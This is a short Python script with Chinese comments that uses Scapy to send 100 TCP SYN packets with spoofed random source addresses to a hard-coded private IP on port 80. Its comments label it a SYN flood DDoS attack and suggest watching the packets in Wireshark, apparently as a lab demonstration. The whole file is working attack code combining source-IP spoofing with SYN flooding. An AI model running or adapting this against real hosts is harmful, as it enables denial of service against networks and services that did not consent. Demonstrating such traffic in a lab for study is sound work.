from scapy.all import IP, TCP, send
import random

# 目标IP（改成你本机IP也可以）
TARGET_IP = "172.20.10.2"
TARGET_PORT = 80

def send_syn_flood():
    print("正在发送 SYN Flood 包（DDoS 攻击）...")
    print("打开 Wireshark 就能看到大量 TCP SYN 包！")
    
    for i in range(100):
        # 伪造随机源IP
        src_ip = f"192.168.1.{random.randint(100, 200)}"
        src_port = random.randint(1000, 65535)
        
        # 构造 SYN 包
        ip = IP(src=src_ip, dst=TARGET_IP)
        tcp = TCP(sport=src_port, dport=TARGET_PORT, flags="S")  # S = SYN
        
        # 发送
        send(ip/tcp, verbose=0)
    
    print("发送完成！Wireshark 里能看到 DDoS 攻击包了！")

if __name__ == "__main__":
    send_syn_flood()